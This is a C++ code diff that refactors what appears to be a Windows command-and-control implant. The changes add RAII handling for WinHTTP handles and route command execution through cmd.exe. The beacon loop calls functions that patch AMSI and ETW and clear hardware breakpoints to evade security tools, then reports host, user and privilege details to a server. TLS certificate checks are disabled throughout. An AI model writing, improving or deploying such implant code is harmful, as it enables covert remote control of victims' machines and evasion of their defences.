@@ -118,6 +118,23 @@ std::wstring DecryptString(const uint8_t* enc, size_t len, const std::wstring& k
 // WinHTTP transport layer
 // ---------------------------------------------------------------------------
 
+// RAII wrapper — destructor closes all three handles in correct order
+// regardless of which allocation failed, eliminating all early-return leaks.
+struct WinHttpHandles {
+    HINTERNET session  = nullptr;
+    HINTERNET connect  = nullptr;
+    HINTERNET request  = nullptr;
+    ~WinHttpHandles() {
+        if (request) WinHttpCloseHandle(request);
+        if (connect) WinHttpCloseHandle(connect);
+        if (session) WinHttpCloseHandle(session);
+    }
+    // Non-copyable
+    WinHttpHandles() = default;
+    WinHttpHandles(const WinHttpHandles&) = delete;
+    WinHttpHandles& operator=(const WinHttpHandles&) = delete;
+};
+
 struct HttpResponse {
     DWORD  statusCode;
     std::string body;
@@ -132,39 +149,34 @@ static HttpResponse WinHttpRequest(
     const std::wstring& extraHeaders
 ) {
     HttpResponse resp = {0, ""};
+    WinHttpHandles h;
 
-    HINTERNET hSession = WinHttpOpen(
+    h.session = WinHttpOpen(
         config::USER_AGENT,
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS, 0
     );
-    if (!hSession) return resp;
+    if (!h.session) return resp;
 
-    HINTERNET hConnect = WinHttpConnect(hSession, host.c_str(), port, 0);
-    if (!hConnect) {
-        WinHttpCloseHandle(hSession);
-        return resp;
-    }
+    h.connect = WinHttpConnect(h.session, host.c_str(), port, 0);
+    if (!h.connect) return resp;
 
-    HINTERNET hRequest = WinHttpOpenRequest(
-        hConnect, verb.c_str(), path.c_str(),
+    h.request = WinHttpOpenRequest(
+        h.connect, verb.c_str(), path.c_str(),
         nullptr, WINHTTP_NO_REFERER,
         WINHTTP_DEFAULT_ACCEPT_TYPES,
         WINHTTP_FLAG_SECURE
     );
-    if (!hRequest) {
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return resp;
-    }
+    if (!h.request) return resp;
 
-    // Accept self-signed / invalid certs (lab environment)
+    // Accept self-signed / invalid certs (lab environment).
+    // Remove SECURITY_FLAG_IGNORE_* flags before production deployment.
     DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA
                 | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                 | SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                 | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
-    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
+    WinHttpSetOption(h.request, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
 
     // Add custom headers
     std::wstring headers = L"Content-Type: application/json\r\n";
@@ -176,13 +188,13 @@ static HttpResponse WinHttpRequest(
         headers += L"\r\n";
     }
 
-    WinHttpAddRequestHeaders(hRequest, headers.c_str(),
+    WinHttpAddRequestHeaders(h.request, headers.c_str(),
                              static_cast<DWORD>(headers.size()),
                              WINHTTP_ADDREQ_FLAG_ADD);
 
     // Send request
     BOOL sent = WinHttpSendRequest(
-        hRequest,
+        h.request,
         WINHTTP_NO_ADDITIONAL_HEADERS, 0,
         bodyUtf8.empty() ? WINHTTP_NO_REQUEST_DATA : const_cast<char*>(bodyUtf8.data()),
         static_cast<DWORD>(bodyUtf8.size()),
@@ -190,34 +202,27 @@ static HttpResponse WinHttpRequest(
         0
     );
 
-    if (!sent || !WinHttpReceiveResponse(hRequest, nullptr)) {
-        WinHttpCloseHandle(hRequest);
-        WinHttpCloseHandle(hConnect);
-        WinHttpCloseHandle(hSession);
-        return resp;
-    }
+    if (!sent || !WinHttpReceiveResponse(h.request, nullptr)) return resp;
 
     // Read status code
     DWORD statusSize = sizeof(resp.statusCode);
-    WinHttpQueryHeaders(hRequest,
+    WinHttpQueryHeaders(h.request,
         WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
         WINHTTP_HEADER_NAME_BY_INDEX,
         &resp.statusCode, &statusSize, WINHTTP_NO_HEADER_INDEX);
 
-    // Read response body
+    // Read response body — capped at config::CMD_OUTPUT_MAX (same limit as exec output)
     DWORD available = 0;
-    while (WinHttpQueryDataAvailable(hRequest, &available) && available > 0) {
+    while (WinHttpQueryDataAvailable(h.request, &available) && available > 0) {
         std::vector<char> buf(available);
         DWORD read = 0;
-        if (WinHttpReadData(hRequest, buf.data(), available, &read) && read > 0) {
+        if (WinHttpReadData(h.request, buf.data(), available, &read) && read > 0) {
             resp.body.append(buf.data(), read);
         }
-        if (resp.body.size() > 1024 * 1024) break;  // safety cap: 1 MB
+        if (resp.body.size() > config::CMD_OUTPUT_MAX) break;
     }
 
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    // h destructor closes h.request, h.connect, h.session in order
     return resp;
 }
 
@@ -236,8 +241,9 @@ std::wstring ExecuteCommand(const std::wstring& cmd) {
     // Prevent read handle from being inherited
     SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
 
-    // Build command line: cmd.exe /C "<command>"
-    std::wstring cmdLine = L"cmd.exe /C " + cmd;
+    // Wrap in outer quotes so shell operators (&, |, >, spaces) in cmd
+    // are passed as literal arguments rather than interpreted by cmd.exe.
+    std::wstring cmdLine = L"cmd.exe /C \"" + cmd + L"\"";
 
     STARTUPINFOW si = {0};
     si.cb          = sizeof(si);
@@ -370,14 +376,17 @@ BOOL SendResult(const std::wstring& sessionId, const std::wstring& output) {
 
 VOID BeaconLoop() {
     Session session;
-    session.hostname    = GetHostname();
-    session.username    = GetUsername();
-    session.build       = GetOSBuild();
-    session.elevated    = IsElevated();
-    session.amsiPatched = TRUE;
-    session.etwPatched  = TRUE;
-    session.hwbpsCleared= TRUE;
-    session.sessionId   = GetHostnameHash() + L"|" + session.username;
+    session.hostname     = GetHostname();
+    session.username     = GetUsername();
+    session.build        = GetOSBuild();
+    session.elevated     = IsElevated();
+    // Derive patch status from actual return values — server receives accurate
+    // capability state. If a patch function is stubbed and returns TRUE, that's
+    // fine; if it fails, the beacon correctly reports it as unpatched.
+    session.amsiPatched  = PatchAMSI();
+    session.etwPatched   = PatchETW();
+    session.hwbpsCleared = ClearHardwareBreakpoints();
+    session.sessionId    = GetHostnameHash() + L"|" + session.username;
 
     DWORD consecutiveFailures = 0;
 
